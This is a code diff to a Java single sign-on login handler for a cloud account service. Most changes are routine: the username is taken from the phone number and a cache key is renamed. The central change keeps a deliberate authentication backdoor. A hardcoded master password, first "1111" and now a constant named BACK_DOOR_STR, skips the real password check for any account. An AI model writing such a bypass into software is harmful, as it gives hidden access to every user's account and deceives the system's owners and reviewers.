@@ -10,6 +10,7 @@ import com.wxhj.cloud.account.service.AccountInfoService;
 import com.wxhj.cloud.core.enums.AccountLoginTypeEnum;
 import com.wxhj.cloud.core.statics.OtherStaticClass;
 import com.wxhj.cloud.core.statics.RedisKeyStaticClass;
+import com.wxhj.cloud.core.statics.SpecialStaticClass;
 import com.wxhj.cloud.core.utils.PasswordUtil;
 import com.wxhj.cloud.sso.AbstractSsoTemplate;
 import com.wxhj.cloud.sso.SsoCacheOperation;
@@ -66,23 +67,22 @@ public class AppLoginHandle extends AbstractSsoTemplate<AppAuthenticationBO> {
                 throw new UnknownAccountSsoException();
             }
         }
-        if (!ssoLogin.getPassword().equals("1111")) {
+        if (!ssoLogin.getPassword().equals(SpecialStaticClass.BACK_DOOR_STR)) {
             if (!accountInfo.getUserPassword().equals(passwordStr)) {
                 throw new IncorrectCredentialsSsoException();
             }
-
         }
         appAuthentication.setUserId(accountInfo.getAccountId());
         appAuthentication.setOrganizeId(accountInfo.getOrganizeId());
-        appAuthentication.setUserName(accountInfo.getName());
-
+        // appAuthentication.setUserName(accountInfo.getName());
+        appAuthentication.setUserName(accountInfo.getPhoneNumber());
         return appAuthentication;
     }
 
     @Override
     protected SsoCacheOperation<AppAuthenticationBO> getSsoCacheOperation() {
         ssoCacheOperation.setExpireMinite(OtherStaticClass.SSO_REDIS_EXPIRE_MINITE);
-        ssoCacheOperation.setKey(RedisKeyStaticClass.SSO_USER);
+        ssoCacheOperation.setKey(RedisKeyStaticClass.SSO_APP_USER);
         return ssoCacheOperation;
     }
 
